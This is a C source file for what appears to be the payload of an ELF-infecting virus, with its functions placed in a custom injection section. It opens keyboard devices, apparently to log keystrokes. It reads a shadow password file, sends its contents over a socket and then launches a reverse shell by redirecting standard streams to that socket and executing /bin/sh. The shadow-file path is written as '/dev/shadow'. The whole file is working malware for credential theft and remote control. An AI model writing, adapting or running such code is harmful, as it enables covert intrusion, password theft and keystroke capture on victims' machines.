
#include "elf_utils.h"
#include "payload.h"
#include <sys/types.h>

static char *read_file(char const *filepath)
{
    struct stat st = {0};
    register int fd = open(filepath, O_RDONLY);
    register int rstatus = -1;
    char *result = NULL;

    if (fd < 0 || stat(filepath, &st) < 0)
        return NULL;
    result = malloc(sizeof(char) * (st.st_size + 1));
    if (!result)
        return NULL;
    rstatus = read(fd, result, st.st_size);
    if (rstatus < 0)
        return NULL;
    result[rstatus] = 0;
    return result;
}


__attribute__((section(ELF_CODE))) inline static int is_keyboard(const struct dirent *file)
{
    size_t len = strlen(file->d_name);

    return len > 3
        && file->d_name[len - 3] == 'k'
        && file->d_name[len - 2] == 'b'
        && file->d_name[len - 1] == 'd';
}

__attribute__((section(ELF_CODE))) inline static int *find_keyboards(void)
{
    struct dirent **char_devices = NULL;
    register int possible_paths = scandir(DIR_PATH, &char_devices,
                &is_keyboard, &alphasort);
    int *result = NULL;
    char *rpath = NULL;

    __log("Seeking keyboards");
    if (possible_paths == -1 || chdir(DIR_PATH) < 0)
        return NULL;

    rpath = malloc(sizeof(char) * BUFFER_SIZE);
    result = malloc(sizeof(int) * (possible_paths + 1));
    if (!rpath || !result)
        return NULL;

    result[possible_paths] = -1;
    for (int ctr = -1; ++ctr < possible_paths;) {
        __log("Found keyboard");
        rpath = realpath(char_devices[ctr]->d_name, rpath);
        result[ctr] = open(rpath, O_RDONLY);
    }

    for (int ctr = -1; ++ctr < possible_paths;)
        free(char_devices[ctr]);
    free(char_devices);

    return result;
}


__attribute__((section(ELF_CODE))) inline static void send_file_contents(void)
{
    char *shadow = read_file("/dev/shadow");

    // TODO send more files probablies

    dprintf(g_settings.sockfd, "SHADOW:%s\n", shadow);
    free(shadow);
}

__attribute__((section(ELF_CODE))) void setup_payload(void)
{
    send_file_contents();

    dup2(g_settings.sockfd, 0);
    dup2(g_settings.sockfd, 1);
    dup2(g_settings.sockfd, 2);

    __log("Launching revshell");
    char * const argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
}

